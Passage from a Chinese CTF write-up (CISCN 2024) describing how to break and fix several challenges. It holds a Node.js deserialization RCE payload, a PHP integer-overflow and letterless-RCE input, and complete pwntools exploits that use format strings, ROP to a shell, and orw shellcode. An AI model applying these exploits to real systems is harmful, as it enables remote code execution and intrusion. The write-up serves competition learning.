function_">redirect</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;);<br><br><br><span class="hljs-comment">//已弃用的登录</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public/login.html&#x27;</span>));<br>&#125;);<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">profile</span>)&#123;<br>        <span class="hljs-keyword">var</span> str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Buffer</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">profile</span>, <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-keyword">var</span> obj = serialize.<span class="hljs-title function_">unserialize</span>(str);<br><span class="hljs-keyword">if</span> (obj.<span class="hljs-property">username</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">escape</span>(obj.<span class="hljs-property">username</span>) === <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Hello World&quot;</span>);<br>&#125;<br>&#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;public/data&#x27;</span>));<br>&#125;<br>&#125;);<br><br><span class="hljs-comment">//QQ</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/qq&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br><span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> !== <span class="hljs-string">&quot;admin&quot;</span> || req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> !== <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;login&#x27;</span>);<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(req.<span class="hljs-property">cookies</span>.<span class="hljs-property">username</span> === <span class="hljs-string">&quot;admin&quot;</span> &amp;&amp; req.<span class="hljs-property">cookies</span>.<span class="hljs-property">is_admin</span> === <span class="hljs-string">&quot;true&quot;</span>)&#123;<br>res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname, data_path));<br>&#125;<br>&#125;);<br><br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">80</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>);<br></code></pre></td></tr></table></figure><p>在login的时候执行了<code>serialize.unserialize(str)</code>，可以打nodejs反序列化</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;rce&quot;</span>:<span class="hljs-string">&quot;_$$ND_FUNC$$_function()&#123;require(&#x27;</span>child_process&#x27;).<span class="hljs-built_in">exec</span>(<span class="hljs-string">&#x27;cat /this_is_your_ffflagg &gt; /tmp/1.txt&#x27;</span>,<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(error,stdout,stderr)</span> &#123;<span class="hljs-title">console</span>.<span class="hljs-title">log</span><span class="hljs-params">(stdout)</span>&#125;);&#125;<span class="hljs-params">()</span>&quot;&#125;</span><br></code></pre></td></tr></table></figure><p>利用目录穿越拿到flag</p><h2 id="fix-3"><a href="#fix-3" class="headerlink" title="fix"></a>fix</h2><p>提示：应修尽修，xss</p><p>没有修复成功</p><h1 id="pwn-ezwp"><a href="#pwn-ezwp" class="headerlink" title="pwn-ezwp"></a>pwn-ezwp</h1><h2 id="break-4"><a href="#break-4" class="headerlink" title="break"></a>break</h2><p>非预期：phpinfo中直接搜flag</p><p>预期解：</p><p>php.ini里可以看到引用了myphp.so</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">extension=/home/myphp.so<br></code></pre></td></tr></table></figure><p>ida分析</p><p>进入<code>get_module</code>函数，通过扩展函数表，可以看到<code>myphp.so</code>扩展导出了三个函数: myphp_test1,myphp_test2,phppwn</p><p><img src="/img/wp/2024/2024ciscn-ezwp_break_1.png"></p><p>进入<code>phppwn</code>，发现会验证密钥后读取flag输出</p><p>但是这里<code>len</code>的类型是<code>unsigned __int8</code>，所以<code>len=strlen(arg)&amp;0xff</code>。同时密钥长度32，限制长度24，可以使用整数溢出进行绕过</p><p><img src="/img/wp/2024/2024ciscn-ezwp_break_2.png"></p><p>exp</p><p>字符串长度&amp;0xff&lt;0x18 即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">hVymkNmp0NM0NcYCswNtFbUZuG1GXbwUaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa<br></code></pre></td></tr></table></figure><p>加上无字母rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">phppwn</span>(<span class="hljs-string">&quot;hVymkNmp0NM0NcYCswNtFbUZuG1GXbwUaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>F%<span class="hljs-number">88</span>%<span class="hljs-number">91</span>)(~%<span class="hljs-number">97</span>%A9%<span class="hljs-number">86</span>%<span class="hljs-number">92</span>%<span class="hljs-number">94</span>%B1%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>F%CF%B1%B2%CF%B1%<span class="hljs-number">9</span>C%A6%BC%<span class="hljs-number">8</span>C%<span class="hljs-number">88</span>%B1%<span class="hljs-number">8</span>B%B9%<span class="hljs-number">9</span>D%AA%A5%<span class="hljs-number">8</span>A%B8%CE%B8%A7%<span class="hljs-number">9</span>D%<span class="hljs-number">88</span>%AA%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E%<span class="hljs-number">9</span>E);<br></code></pre></td></tr></table></figure><h2 id="fix-4"><a href="#fix-4" class="headerlink" title="fix"></a>fix</h2><p>应该是需要修改字符串长度比较类型为长整型</p><h1 id="pwn-cJSON"><a href="#pwn-cJSON" class="headerlink" title="pwn-cJSON"></a>pwn-cJSON</h1><h2 id="break-5"><a href="#break-5" class="headerlink" title="break"></a>break</h2><p>在delete功能中存在格式化字符串，利用格式化字符串可以获取shell</p><p><img src="/img/wp/2024/2024ciscn-cJSON-BREAK_1.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">all</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&quot;&gt;&quot;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">name,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,name)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;len:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)).encode())<br>    p.sendlineafter(<span class="hljs-string">b&#x27;data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">name</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,name)<br><span class="hljs-comment">#p=process(&quot;./pwn&quot;)</span><br>p=remote(<span class="hljs-string">&quot;10.1.123.16&quot;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;bp $rebase(0x6b3b)&#x27;)</span><br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><span class="hljs-comment">#libc=ELF(&quot;./libc&quot;)</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>offset=<span class="hljs-number">20</span><br>code=&#123;<span class="hljs-string">&quot;%25$p&quot;</span>:<span class="hljs-number">1</span>&#125;<br>payload=json.dumps(code)<br>p.sendlineafter(<span class="hljs-string">b&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)).encode())<br>p.sendlineafter(<span class="hljs-string">b&#x27;Json:&#x27;</span>,payload.encode())<br>free(<span class="hljs-string">&quot;%27$p&quot;</span>)<br><br>p.readuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>libc.address=d-<span class="hljs-number">0x24083</span><br><span class="hljs-comment">#libc.address=d-0x29d90</span><br>free(<span class="hljs-string">&quot;%11$p&quot;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>e.address=d-<span class="hljs-number">0x6b04</span><br><br>free(<span class="hljs-string">&quot;%10$p&quot;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;[&#x27;</span>)<br>d=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;]&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>mainstack=d+<span class="hljs-number">8</span><br>stack=d-<span class="hljs-number">0x78</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>rdi=e.address+<span class="hljs-number">0x0000000000006ba3</span><br>ret=rdi+<span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(mainstack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(rdi))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(ret))<br>payload=p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(payload):<br>    <span class="hljs-keyword">if</span> v==<span class="hljs-number">0</span>:<br>        data=<span class="hljs-string">&quot;%22$hhn&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        data=(<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(v)+<span class="hljs-string">&quot;c%&quot;</span>+<span class="hljs-string">&quot;22$hhn&quot;</span>)<br>    data=data.encode().ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(mainstack+i)<br>    <span class="hljs-built_in">print</span>(data)<br>    free(data)<br>retaddr=e.address+<span class="hljs-number">0x6b3a</span><br>free((<span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(retaddr&amp;<span class="hljs-number">0xffff</span>)+<span class="hljs-string">&quot;c%&quot;</span>+<span class="hljs-string">&quot;22$hn&quot;</span>).encode().ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)+p64(stack))<br><br>pause()<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="fix-5"><a href="#fix-5" class="headerlink" title="fix"></a>fix</h2><p>将delete功能中的printf函数修改为puts</p><p><img src="/img/wp/2024/2024ciscn-cJS0N-FIX_1.png"></p><p>在edit功能中可能存在栈溢出，修改memcpy的第三个参数</p><p><img src="/img/wp/2024/2024ciscn-cJS0N-FIX_2.png"></p><h1 id="pwn-baby-jit"><a href="#pwn-baby-jit" class="headerlink" title="pwn-baby_jit"></a>pwn-baby_jit</h1><h2 id="break-6"><a href="#break-6" class="headerlink" title="break"></a>break</h2><p>shellcode中有8字节是自定义的,利用这8字节进行二次写，实现orw</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exec</span>():<br>    <span class="hljs-keyword">pass</span><br><br>shellcode=<span class="hljs-string">&quot;&quot;&quot;xor rdi,rdi</span><br><span class="hljs-string">xchg rsi,rdx</span><br><span class="hljs-string">syscall&quot;&quot;&quot;</span><br><br>p=remote(<span class="hljs-string">&quot;10.1.123.17&quot;</span>,<span class="hljs-number">9999</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendline(<span class="hljs-string">&quot;add &quot;</span>+<span class="hljs-built_in">str</span>(u64(asm(shellcode))))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x20</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-string">&quot;add &quot;</span>+<span class="hljs-built_in">str</span>(u64(asm(shellcode))))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;offset?&#x27;</span>,<span class="hljs-string">&#x27;0.2&#x27;</span>)<br><br>shellcode=shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag&quot;</span>)+shellcraft.read(<span class="hljs-number">3</span>,<span class="hljs-number">0x100000</span>+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)+shellcraft.write(<span class="hljs-number">1</span>,<span class="hljs-number">0x100000</span>+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x8</span>+asm(shellcode))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="fix-6"><a href="#fix-6" class="headerlink" title="fix"></a>fix</h2><p>尝试了 修改指令单位大小，不使用浮点数进行偏移 没有防御成功</p><h1 id="pwn-printf-master"><a href="#pwn-printf-master" class="headerlink" title="pwn-printf-master"></a>pwn-printf-master</h1><h2 id="break-7"><a href="#break-7" class="headerlink" title="break"></a>break</h2><p>利用栈中指向args和envs的指针数据修改printf函数返回地址，进行多次格式化字符串，最终修改printf的返回地址为gadget获得shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>(<span class="hljs-params">p</span>):<br>    libc=ELF(<span class="hljs-string">&quot;./libc-2.31.so&quot;</span>)<br>    gadget=<span class="hljs-number">0xe6af1</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(gadget))<br>    gdb.attach(p,<span 